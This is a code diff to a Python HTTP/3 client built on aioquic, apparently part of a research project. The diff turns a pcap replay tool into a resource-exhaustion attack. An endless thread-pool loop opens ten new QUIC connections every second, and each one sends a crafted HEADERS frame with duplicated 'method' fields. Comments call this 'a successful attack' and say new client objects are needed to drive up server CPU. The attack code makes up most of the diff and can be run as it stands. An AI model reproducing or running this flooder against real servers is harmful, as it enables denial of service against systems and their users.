@@ -25,9 +25,9 @@ from aioquic.quic.logger import QuicFileLogger
 from aioquic.quic.connection import QuicConnection, QuicNetworkPath
 from aioquic.tls import CipherSuite, Epoch
 
-import util  # PRETT3 project module
 import aioquic.tls as tls
 from aioquic.quic.connection import *
+import concurrent.futures
 
 logger = logging.getLogger("client")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
@@ -203,16 +203,17 @@ class HttpClient():
                 (b":method", "GET".encode()),
                 (b":scheme", "HTTPS".encode()),
                 (b":authority", self.hostname.encode()),
-                (b":path", "/".encode()),
+                (b":path", "/600k.html".encode()),
                 (b"user-agent", "PRETT3 client".encode()),
+                (b"method", "HEAD".encode()),
+                (b"method", "POST".encode()),
+                (b"method", "GET".encode()),
+                (b"settings", "0".encode()),
             ]
 
         frame_data =  self._http._encode_headers(stream_id, headers)
 
         return aioquic.h3.connection.encode_frame(FrameType.HEADERS, frame_data)
-
-        #self._http._quic.send_stream_data(
-        #    stream_id, aioquic.h3.connection.encode_frame(FrameType.HEADERS, frame_data), False)
 
 
     def get_builder(self, epoch: Epoch):
@@ -917,72 +918,49 @@ class HttpClient():
                 self.receive_datagram(data, now=time.process_time())
         except socket.timeout: pass
 
+
 def main(
     configuration: QuicConfiguration,
-    url: str,
-    sample_msg: pyshark.FileCapture
+    url: str
 ) -> None:
-
-    # Step 1: Initialize the HTTP/3 client with QUIC configuration
-    h3client = HttpClient(configuration, urlparse(url).netloc)
-
-    # Step 2: Establish the initial connection (handshake)
-    print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
-    h3client.connect()
-    h3client.read_from_buffer()  # Receive any response from the server
-
-    #time.sleep(1)
-
-    # Step 3: Complete the connection (finish handshake)
-    print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
-    h3client.complete_connection()
-    h3client.read_from_buffer()  # Receive any response from the server
-
-    #time.sleep(1)
-
-    
-    # Step 4: Replay only 1-RTT messages from sample_msg
-    print("\033[93m\n[Replaying 1-RTT messages...]\033[0m")
-
-    for msg in sample_msg:
-        try:
-            if hasattr(msg, 'quic'):
-                # Skip long header QUIC packets (identified by 'header_form' == "1")
-                if hasattr(msg.quic, 'header_form') and msg.quic.header_form == "1":
-                    print(f"\033[90mSkipping long header QUIC message: {util.h3msg_to_str(msg)}\033[0m")
-                    continue
-                
-                # Process only short header (1-RTT) QUIC packets
-                print(f"\033[92mReplaying short header (1-RTT) QUIC message: {util.h3msg_to_str(msg)}\033[0m")
-                h3client.replay_sample_msg(msg)
-                h3client.read_from_buffer()
-                time.sleep(0.1)
-            else:
-                print(f"\033[92mNo QUIC layer found in message: {util.h3msg_to_str(msg)}\033[0m")
-
-        except AttributeError:
-            print(f"\033[92mError processing message: {util.h3msg_to_str(msg)}\033[0m")
-
-
-    print("\033[93m\n[Replay completed]\033[0m")
     
     """
-    headers_data = h3client.craft_sample_headers_frame()
-    h3client.send_quic_stream(headers_data)
-    h3client.read_from_buffer()
+    We can achieve a successful attack even without those extra headers and body
     """
+    
+    def background_task():
+        
+        # Step 1: Initialize the HTTP/3 client with QUIC configuration
+        h3client = HttpClient(configuration, urlparse(url).netloc)
 
-def init(args):
-    print("\n[STEP 1] Initializing...")
-    os.system("sudo rm -r __pycache__")
+        '''
+        A new h3client object should be created for each task. 
+        If we use the same object for all, it will not increase CPU.
+        One reason might be that differnt h3clients have different connection IDs
+        '''
 
-    SERVER_ADDR = args.url
-    pcapfile = args.pcap
-    # outdir = setup_logger(pcapfile, 0)
-    # _enable_capture()
+        # Step 2: Establish the initial connection (handshake)
+        print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
+        h3client.connect()
+        h3client.read_from_buffer()  # Receive any response from the server
 
-    print("  [+] Initializing done!\n    => pcap : %s, SERVER_ADDR : %s" % (pcapfile, SERVER_ADDR))
-    return
+        # Step 3: Complete the connection (finish handshake)
+        print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
+        h3client.complete_connection()
+        h3client.read_from_buffer()  # Receive any response from the server
+
+        # Step 4: Replay only 1-RTT messages from sample_msg
+        headers_data = h3client.craft_sample_headers_frame()
+        h3client.send_quic_stream(headers_data)
+        h3client.read_from_buffer()
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = []
+        while True:
+            for i in range(10):
+                # Submit each iteration as a separate task
+                futures.append(executor.submit(background_task))
+            time.sleep(1)
 
 
 if __name__ == "__main__":
@@ -991,9 +969,6 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="HTTP/3 client")
     parser.add_argument(
         "url", type=str, help="the URL to query (must be HTTPS)"
-    )
-    parser.add_argument(
-        "pcap", type=str, help="the PATH of QUIC or HTTP/3 traffic (must be Wireshark-readable pcap)"
     )
     parser.add_argument(
         "--ca-certs", type=str, help="load CA certificates from the specified file"
@@ -1055,13 +1030,6 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    '''
-    logging.basicConfig(
-        format="%(asctime)s %(levelname)s %(name)s %(message)s",
-        level=logging.DEBUG if args.verbose else logging.INFO,
-    )
-    '''
-
     # prepare configuration
     configuration = QuicConfiguration(
         is_client=True,
@@ -1086,16 +1054,10 @@ if __name__ == "__main__":
     if args.secrets_log:
         configuration.secrets_log_file = open(args.secrets_log, "a")
 
-    ### General setting ###
-    init(args)
     
-    ### Extract initial state machine ###
-    http3_basic_messages = util.h3msg_from_pcap(args.pcap, client_only=True)
-
     main(
             configuration=configuration,
-            url=args.url,
-            sample_msg = http3_basic_messages
+            url=args.url
         )
     
     
